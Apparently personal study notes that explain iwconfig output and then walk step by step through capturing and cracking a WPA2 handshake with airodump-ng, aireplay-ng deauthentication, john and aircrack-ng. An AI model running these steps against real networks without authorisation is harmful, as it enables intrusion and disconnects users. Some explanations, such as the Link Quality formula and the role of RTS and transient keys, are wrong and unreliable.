# This is a file explaining how wireless networking commands work on Unix systems.



The command `iwconfig` can be used to display information about the status of the wireless adapter (network card) and its connection mode.
This command extracts the information from the file `/proc/net/wireless`.
A typical output looks like this:

```bash
>>>iwconfig

lo        no wireless extensions.

eth0  no wireless extensions.

wlan1  IEEE 802.11  ESSID:"my_AP_name"  
          Mode:Managed  Frequency:5.5 GHz  Access Point: 62:E9:31:69:94:A0   
          Bit Rate=324.2 Mb/s   Tx-Power=22 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=48/70  Signal level=-62 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:46   Missed beacon:0

```

### The following information are provided:

1. **ESSID** - the network name / Domain ID (not an identifier)
    - used to identify which devices are under the same network (they share the same ESSID)
2. **Mode** - under which mode the network card is currently working. The available modes are:
    - Ad-Hoc: a peer-to-peer connection between 2 or more devices
    - Managed: the network card is connected to an Access Point (AP)
    - Master: the network card is acting as an Access Point (AP)
    - Repeater: the network card is acting as a repeater (it receives and forwards packets)
    - Secondary: the network card is acting as a backup to another network card
    - Monitor: the network card is in monitor mode (it can capture all packets in the air)
    - Auto: the network card chooses the best mode automatically
3. **Frequency** - the operating frequency of the network card. Values below 1000 indicate a channel.
 (bandwitdh is split into channels to distrubute AP traffic load) Values above 1000 are frequency in Hz.
4. **Access Point (AP)** - address that specifies the network cell identity (unlike ESSID, its unique for each cell). This value is returned
as an identifier when scanning the networks
5. **Bit Rate** - bitrate for the transmission of all data, including overhead. Specifies the speed of the connection. (in bit/s)
6. **Tx-Power** - trasmit power in dBm (defined as: [ P ] = [ 30 + 10log(W) ] )
7. **Retry limit** - Specifies the number of times a packet will be resent in case the packet is not received at the receiver. There are 2 types of packets:
    - short packets: shorter version of a packet which have reduced payload
    - long packets: usual packets
8. **RTS thr** - adds a [Handshake](Four_Way_Handshake.md) to each packet increasing the overhead.
9. **Fragment thr** - splits the packets into smaller fragments which are sent separately. This increases the overhead but reduces the chance of packet loss.
10. **Power Management** - specifies if the power management is enabled or disabled. If enabled, the network card will go into sleep mode when not in use.
11. **Link Quality** - the quality of the connection. The higher the value, the better the connection. The value is calculated as follows:
    - Link Quality = (Signal level / Noise level) * 100
    - Signal level: the strength of the signal in dBm
    - Noise level: the strength of the noise in dBm
12. **Signal level** - the strength of the signal in dBm. The higher the value, the better the connection.

The command `airmon-ng` can be used to display information about the wireless adapters and their status.
A typical output looks like this:

```bash
>>>airmon-ng

PHY	Interface	Driver		Chipset
phy0	wlan1		ath9k		Qualcomm Atheros AR9485 Wireless Network Adapter (rev 01)
phy1	wlan0		ath9k_htc	Qualcomm Atheros AR9271 802.11n
```

The command `airodump-ng` can be used to display information about the wireless networks in the area.
A typical output looks like this:

```bash
>>>airodump-ng wlan1

CH  1 ][ Elapsed: 1 min ][ 2017-12-10 17:02 ][ fixed channel wlan1: -1
                                                                                                 
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                
 62:E9:31:69:94:A0  -62       10        0    0   5  270  WPA2 CCMP   PSK  my_AP_name
```



Start the attack by executing:
```bash
sudo airmon-ng check kill 
```
This will kill all processes (for example of Network Manager) that might interfere with the attack.
To List all available networks use:

```bash
sudo airodump-ng wlan0
```
This will force the mode **Monitor** on the network adapter. To start caputring packets on a specific ESSID use:

```bash
sudo airodump-ng -w output -N <ESSID> wlan0 
```

To increase chances of getting a handshake, deauthenticate a client from the network. Here, there will be 20 deauth packets sent.
Make sure to run this command in a separate terminal window to keep the capture running.
```bash
sudo aireplay-ng -0 20 -e <ESSID> wlan0
```

Open the file containing the [Handshake](Four_Way_Handshake.md) generated by airodump-ng with the command:
```bash
aircrack-ng  *<file_name>.cap -e <ESSID>
```

To crack the password, give aircrack-ng a wordlist containing possible passwords:
```bash
john -incremental -stdout | aircrack-ng output*.cap -w - -e <ESSID>
```

The network card is still in **Monitor** mode. To set it back to **Managed** mode in order to connect to a network, use:
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

Apart from that, start the NetworkManager service again:
```bash
sudo service NetworkManager restart
```

To connect to a network from the command line, use:
```bash
sudo nmtui-connect <ESSID>
```

### Password Cracking (from the handshake)
We will use a dictionary generated by john the ripper to crack the password.
The command below will generate a dictionary and pipe it to aircrack-ng. The -w - option tells aircrack-ng to read the dictionary from stdin.
Replace the output with the name of the file generated by airodump-ng.
```bash
john -incremental -stdout | aircrack-ng output*.cap -w - -e <ESSID>
```

An expected output from the command would be:
```bash
                   [00:01:39] 992510 keys tested (10078.48 k/s) 


                           KEY FOUND! [ password ]


      Master Key     : FF 56 C3 C8 8D 82 DA AB 16 E1 F2 C9 2C 3D 7C D1 
                       6B 2E 93 75 D6 C8 6A 93 1C EC C1 1D 95 D6 49 0A 

      Transient Key  : F9 42 85 BF 30 2E 27 C8 C8 A1 6F 50 D8 FA FB 65 
                       E5 93 BE 71 F8 3C CF 12 86 3D 66 2A E0 D1 6B B5 
                       90 CF 1C B6 54 21 3B 8F 7B E1 29 43 76 51 76 66 
                       52 52 C3 6E 68 B9 F5 AE 40 AF 42 28 16 37 F1 BC 

      EAPOL HMAC     : A8 91 AE 8F 8A B0 24 86 11 E9 66 C9 F8 59 DD A9 
```

In the output above, the password is **password**.
The **Master Key** is the key used to encrypt the data. The **Transient Key** is the key used to encrypt the [Handshake](Four_Way_Handshake.md).
The **EAPOL HMAC** is the hash of the [Handshake](Four_Way_Handshake.md).
The details on Master, Transient Keys and EAPOL are given in the file [Handshake](Four_Way_Handshake.md) file.








